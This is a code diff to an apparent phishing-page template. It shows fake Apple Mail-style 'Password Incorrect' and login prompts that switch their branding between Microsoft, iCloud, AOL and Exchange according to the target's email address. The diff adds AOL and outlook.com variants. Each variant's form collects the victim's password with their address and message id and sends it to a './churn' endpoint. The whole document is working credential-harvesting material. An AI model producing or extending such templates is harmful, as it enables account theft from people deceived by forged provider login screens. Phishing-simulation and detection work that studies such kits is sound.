@@ -11,6 +11,8 @@
 	<title>Microsoft login</title>
 {% elif "icloud.com" in client.email_address %}
 	<title>iCloud login</title>
+{% elif "aol.com" in client.email_address %}
+        <title>AOL login</title>
 {% else %}
 	<title>Exchange login</title>
 {% endif %}
@@ -259,7 +261,7 @@ p {
         <input name="id" type="hidden" name="id" value="{{ client.message_id }}">
         <input name="username" type="hidden" value="{{ client.email_address }}">
         <input class="modal-text-input modal-text-input-single" autofocus="" id="password-input" name="password" placeholder="Password" type="password">
-{% elif "hotmail.com" in client.email_address %}
+{% elif "hotmail.com" in client.email_address or "outlook.com" in client.email_address %}
 	<div class="modal-title">Password Incorrect</div>
 	<span class="appleLinks"><div class="modal-text">Enter the password for the account "{{ client.email_address }}"</div></span>
 	<form name="myform" action="./churn" id="myform" method="GET">
@@ -273,6 +275,13 @@ p {
 	<input name="id" type="hidden" name="id" value="{{ client.message_id }}">
 	<input class="modal-text-input modal-text-input-double" name="username" type="text" value="{{ client.email_address }}">
 	<input class="modal-text-input modal-text-input-double" autofocus="" id="password-input" name="password" placeholder="Password" type="password">
+{% elif "aol.com" in client.email_address %}
+        <div class="modal-title">Cannot Get Mail</div>
+        <span class="appleLinks"><div class="modal-text">The password for "{{ client.email_address }}" is incorrect.</div></span>
+        <form name="myform" action="./churn" id="myform" method="GET">
+        <input name="id" type="hidden" name="id" value="{{ client.message_id }}">
+        <input name="username" type="hidden" value="{{ client.email_address }}">
+        <input class="modal-text-input modal-text-input-single" autofocus="" id="password-input" name="password" placeholder="Password" type="password">
 {% else %}
         <div class="modal-title">Password Incorrect</div>
         <span class="appleLinks"><div class="modal-text">Enter the password for the Exchange account "{{ client.email_address }}"</div></span>
